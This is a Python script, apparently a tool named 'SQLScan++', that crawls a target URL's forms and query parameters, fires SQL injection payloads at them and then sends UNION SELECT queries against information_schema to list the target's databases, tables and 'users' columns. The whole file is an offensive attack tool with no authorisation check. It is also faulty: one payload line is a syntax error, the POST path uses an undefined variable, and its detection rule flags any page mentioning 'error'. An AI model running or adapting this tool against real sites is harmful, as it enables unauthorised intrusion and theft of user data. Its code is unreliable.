import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
import argparse

def banner():
    print("""
    SQLScan++ - An advanced SQL injection scanner
    Usage: sqlscan.py -u <url> -dbs
    """)

def test_sqli(url, param, method="GET", data=None):
    """Tests a URL with a single parameter for SQL Injection."""
    payloads = [
        "' OR '1'='1", 
        "" OR 1=1-- ",
        "' AND 1=2 UNION SELECT NULL, NULL--",
        "\" OR \'1\'=\'1",
        "\" AND \'1\'=\'1\""
    ]
    for payload in payloads:
        if method == "POST" and data:
            data[param] = payload
            response = requests.post(url, data=data, timeout=5)
        else:
            vuln_url = f"{url}?{param}={payload}"
            response = requests.get(vuln_url, timeout=5)

        if "sql" in response.text.lower() or "error" in response.text.lower():
            print(f"[!] Potential SQL Injection vulnerability found: {vuln_url}")
            return vuln_url

    print(f"[-] Parameter '{param}' does not appear vulnerable.")
    return None

def extract_forms(url):
    """Extracts and returns forms from a URL."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"[!] Error fetching forms from '{url}': {e}")
        return []

def test_forms(url, forms):
    """Tests all forms for potential SQL Injection."""
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        form_url = urljoin(url, action)
        form_data = {}

        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                form_data[name] = "' OR '1'='1"

        try:
            if method == "post":
                test_sqli(form_url, None, method="POST", data=form_data)
            else:
                test_sqli(form_url, None, method="GET", data=form_data)
        except requests.RequestException as e:
            print(f"[!] Error testing form at '{form_url}': {e}")

def enumerate_databases(vuln_url):
    """Tries to enumerate databases using SQL injection."""
    payloads = [
        "' UNION SELECT schema_name, NULL FROM information_schema.schemata -- ",
        "' UNION SELECT table_name, NULL FROM information_schema.tables -- ",
        "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- "
    ]
    for payload in payloads:
        try:
            response = requests.get(vuln_url + payload, timeout=5)
            if response.status_code == 200:
                print("[+] Enumeration result:")
                soup = BeautifulSoup(response.content, 'html.parser')
                print(soup.get_text())
            else:
                print("[-] Enumeration attempt failed.")
        except requests.RequestException as e:
            print(f"[!] Error during enumeration: {e}")

def deep_scan(url):
    """Performs a deep scan on query parameters and forms."""
    print(f"[+] Initiating deep scan on {url}")
    forms = extract_forms(url)
    print(f"[+] Found {len(forms)} forms.")
    test_forms(url, forms)

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params.keys():
        vuln_url = test_sqli(url, param)
        if vuln_url:
            enumerate_databases(vuln_url)

def main():
    parser = argparse.ArgumentParser(description="SQLScan++ - An advanced SQL injection scanner")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-dbs", "--databases", help="Attempt to enumerate databases", action="store_true")
    args = parser.parse_args()

    url = args.url

    print(f"[+] Scanning target: {url}")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            deep_scan(url)
        else:
            print("[!] Failed to reach the target URL.")
    except requests.RequestException as e:
        print(f"[!] Error connecting to target: {e}")

if __name__ == "__main__":
    banner()
    main()
